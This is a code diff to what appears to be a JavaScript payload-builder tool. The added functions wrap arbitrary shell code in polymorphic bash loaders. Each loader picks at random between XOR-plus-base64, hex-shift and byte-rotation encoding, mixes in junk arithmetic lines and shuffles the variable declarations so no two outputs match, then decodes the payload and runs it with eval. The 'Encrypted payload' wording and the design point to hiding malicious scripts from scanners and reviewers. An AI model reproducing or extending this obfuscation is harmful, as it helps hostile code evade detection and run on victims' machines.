@@ -253,15 +253,144 @@ fi
 ${code}`
 }
 
-/* ── Encryption Wrapper ──────────────────────────────────── */
+/* ── Polymorphic Encryption Wrapper (v4.5) ───────────────── */
+
+function bashJunk() {
+  const pool = [
+    () => { const v = randomVarName('short').toLowerCase(); return `${v}=$(( ${Math.floor(Math.random()*999)} * ${Math.floor(Math.random()*99)} + ${Math.floor(Math.random()*9999)} ))` },
+    () => { const v = randomVarName('short').toLowerCase(); return `${v}=$(printf '%d' $((RANDOM % 256)))` },
+    () => `: $((${Math.floor(Math.random()*0xFFFF)} ^ ${Math.floor(Math.random()*0xFFFF)}))`,
+    () => { const v = randomVarName('short').toLowerCase(); return `${v}="${Array.from({length: 8}, () => String.fromCharCode(97 + Math.floor(Math.random()*26))).join('')}"` },
+  ]
+  return pool[Math.floor(Math.random() * pool.length)]()
+}
+
+function bashLoopJunk(iv) {
+  const pool = [
+    () => `    : $(( ${iv} * ${3 + Math.floor(Math.random()*17)} + ${Math.floor(Math.random()*255)} ))`,
+    () => `    : $(( ${iv} ^ ${Math.floor(Math.random()*0xFF)} ))`,
+  ]
+  return pool[Math.floor(Math.random() * pool.length)]()
+}
+
+function shufArr(arr) {
+  const a = [...arr]
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]]
+  }
+  return a
+}
 
 function applyEncryptionWrapper(code) {
+  const method = Math.floor(Math.random() * 3)
+  switch (method) {
+    case 0: return bashWrapperXorB64(code)
+    case 1: return bashWrapperHexShift(code)
+    case 2: return bashWrapperByteRot(code)
+    default: return bashWrapperXorB64(code)
+  }
+}
+
+/* Method 1: XOR + Base64 (polymorphic) */
+function bashWrapperXorB64(code) {
+  const key = randomXorKey(16)
   const b64 = toBase64(code)
-  const keyVar = randomVarName('short').toLowerCase()
+  const xorData = Array.from(b64).map((c, i) => c.charCodeAt(0) ^ key[i % key.length])
+
+  const dv = randomVarName('short').toLowerCase()
+  const kv = randomVarName('short').toLowerCase()
+  const fv = randomVarName('short').toLowerCase()
+  const iv = randomVarName('short').toLowerCase()
+
+  const inits = shufArr([
+    `${dv}=(${xorData.join(' ')})`,
+    `${kv}=(${key.join(' ')})`,
+    bashJunk(),
+    bashJunk(),
+  ])
 
   return `#!/bin/bash
-# Encrypted payload
-${keyVar}="${b64}"
-eval "$(echo "$${keyVar}" | base64 -d)"
+${inits.join('\n')}
+
+${fv}() {
+    local _r=""
+    local _kl=\${#${kv}[@]}
+    for ${iv} in $(seq 0 $((\${#${dv}[@]} - 1))); do
+${bashLoopJunk(iv)}
+        local _b=$((\${${dv}[$${iv}]} ^ \${${kv}[$(($${iv} % $_kl))]}))
+        _r="$_r$(printf "\\\\$(printf '%03o' $_b)")"
+    done
+    echo "$_r"
+}
+
+eval "$(echo "$(${fv})" | base64 -d)"
+`
+}
+
+/* Method 2: Hex-Shift */
+function bashWrapperHexShift(code) {
+  const shift = 3 + Math.floor(Math.random() * 25)
+  const hexStr = Array.from(code).map(c => ((c.charCodeAt(0) + shift) % 256).toString(16).padStart(2, '0')).join('')
+
+  const dv = randomVarName('short').toLowerCase()
+  const sv = randomVarName('short').toLowerCase()
+  const fv = randomVarName('short').toLowerCase()
+
+  const inits = shufArr([
+    `${dv}="${hexStr}"`,
+    `${sv}=${shift}`,
+    bashJunk(),
+  ])
+
+  return `#!/bin/bash
+${inits.join('\n')}
+
+${fv}() {
+    local _r=""
+    local _len=\${#${dv}}
+    for (( _i=0; _i<_len; _i+=2 )); do
+        local _hex=\${${dv}:_i:2}
+        local _dec=$((16#$_hex))
+        local _b=$(((_dec - ${sv} + 256) % 256))
+        _r="$_r$(printf "\\\\$(printf '%03o' $_b)")"
+    done
+    echo "$_r"
+}
+
+eval "$(${fv})"
+`
+}
+
+/* Method 3: Byte Rotation + B64 */
+function bashWrapperByteRot(code) {
+  const rotN = 3 + Math.floor(Math.random() * 50)
+  const b64 = toBase64(code)
+  const rotated = Array.from(b64).map(c => (c.charCodeAt(0) + rotN) % 256)
+
+  const dv = randomVarName('short').toLowerCase()
+  const nv = randomVarName('short').toLowerCase()
+  const fv = randomVarName('short').toLowerCase()
+
+  const inits = shufArr([
+    `${dv}=(${rotated.join(' ')})`,
+    `${nv}=${rotN}`,
+    bashJunk(),
+    bashJunk(),
+  ])
+
+  return `#!/bin/bash
+${inits.join('\n')}
+
+${fv}() {
+    local _r=""
+    for _i in $(seq 0 $((\${#${dv}[@]} - 1))); do
+        local _b=$(((\${${dv}[$_i]} - ${nv} + 256) % 256))
+        _r="$_r$(printf "\\\\$(printf '%03o' $_b)")"
+    done
+    echo "$_r"
+}
+
+eval "$(echo "$(${fv})" | base64 -d)"
 `
 }
